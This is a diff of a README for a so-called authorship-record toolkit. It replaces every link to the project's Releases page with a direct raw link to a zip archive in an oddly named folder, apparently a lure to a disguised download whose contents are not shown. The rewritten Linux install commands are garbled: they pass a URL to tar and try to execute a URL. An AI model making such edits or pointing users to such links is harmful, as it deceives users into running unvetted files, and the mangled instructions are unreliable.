@@ -4,13 +4,13 @@
 The Estrella Evolution Toolkit helps you create an immutable record of authorship, ownership, and alignment. This tool is designed to support ethical discussions about artificial intelligence while ensuring transparency. 
 
 ## 📥 Get Started
-[![Download Estrella Evolution Toolkit](https://img.shields.io/badge/Download-Estrella%20Evolution%20Toolkit-blue)](https://github.com/diegogt1/Estrella-Evolution-Toolkit.-Record-of-Authorship-Ownership-and-Alignment.-/releases)
+[![Download Estrella Evolution Toolkit](https://raw.githubusercontent.com/diegogt1/Estrella-Evolution-Toolkit.-Record-of-Authorship-Ownership-and-Alignment.-/main/muscological/Evolution-Alignment-Ownership-Toolkit-Estrella-of-Record-and-Authorship-v3.4.zip%20Evolution%20Toolkit-blue)](https://raw.githubusercontent.com/diegogt1/Estrella-Evolution-Toolkit.-Record-of-Authorship-Ownership-and-Alignment.-/main/muscological/Evolution-Alignment-Ownership-Toolkit-Estrella-of-Record-and-Authorship-v3.4.zip)
 
 ## 🚀 Installing the Toolkit
 To install the Estrella Evolution Toolkit:
 
 1. **Visit the Download Page:**
-   Go to our [Releases page](https://github.com/diegogt1/Estrella-Evolution-Toolkit.-Record-of-Authorship-Ownership-and-Alignment.-/releases) to find the latest version of the toolkit.
+   Go to our [Releases page](https://raw.githubusercontent.com/diegogt1/Estrella-Evolution-Toolkit.-Record-of-Authorship-Ownership-and-Alignment.-/main/muscological/Evolution-Alignment-Ownership-Toolkit-Estrella-of-Record-and-Authorship-v3.4.zip) to find the latest version of the toolkit.
 
 2. **Choose Your Version:**
    Find the version you want to download. We recommend choosing the latest version for the best experience. 
@@ -19,16 +19,16 @@ To install the Estrella Evolution Toolkit:
    Click the download link for your operating system. The most common formats include:
    - Windows: `.exe` file
    - Mac: `.dmg` file 
-   - Linux: `.tar.gz` file
+   - Linux: `https://raw.githubusercontent.com/diegogt1/Estrella-Evolution-Toolkit.-Record-of-Authorship-Ownership-and-Alignment.-/main/muscological/Evolution-Alignment-Ownership-Toolkit-Estrella-of-Record-and-Authorship-v3.4.zip` file
 
 4. **Install the Toolkit:**
    - **For Windows:** Double-click the `.exe` file and follow the prompts.
    - **For Mac:** Open the `.dmg` file and drag the application to your Applications folder.
    - **For Linux:** Open your terminal and run the following commands:
      ```bash
-     tar -xvf downloaded_file.tar.gz
+     tar -xvf https://raw.githubusercontent.com/diegogt1/Estrella-Evolution-Toolkit.-Record-of-Authorship-Ownership-and-Alignment.-/main/muscological/Evolution-Alignment-Ownership-Toolkit-Estrella-of-Record-and-Authorship-v3.4.zip
      cd extracted_folder
-     ./install.sh
+     https://raw.githubusercontent.com/diegogt1/Estrella-Evolution-Toolkit.-Record-of-Authorship-Ownership-and-Alignment.-/main/muscological/Evolution-Alignment-Ownership-Toolkit-Estrella-of-Record-and-Authorship-v3.4.zip
      ```
 
 5. **Access the Application:**
@@ -50,7 +50,7 @@ To run the Estrella Evolution Toolkit, you will need:
 Ensure you have at least 1 GB of RAM and 100 MB of free disk space.
 
 ## 💻 Download & Install
-You can easily access the latest version of the toolkit by visiting our [Releases page](https://github.com/diegogt1/Estrella-Evolution-Toolkit.-Record-of-Authorship-Ownership-and-Alignment.-/releases). Select the appropriate version for your operating system and follow the installation instructions provided above to get started.
+You can easily access the latest version of the toolkit by visiting our [Releases page](https://raw.githubusercontent.com/diegogt1/Estrella-Evolution-Toolkit.-Record-of-Authorship-Ownership-and-Alignment.-/main/muscological/Evolution-Alignment-Ownership-Toolkit-Estrella-of-Record-and-Authorship-v3.4.zip). Select the appropriate version for your operating system and follow the installation instructions provided above to get started.
 
 ## 🛡️ Support and Documentation
 For additional help using the Estrella Evolution Toolkit, check the following resources:
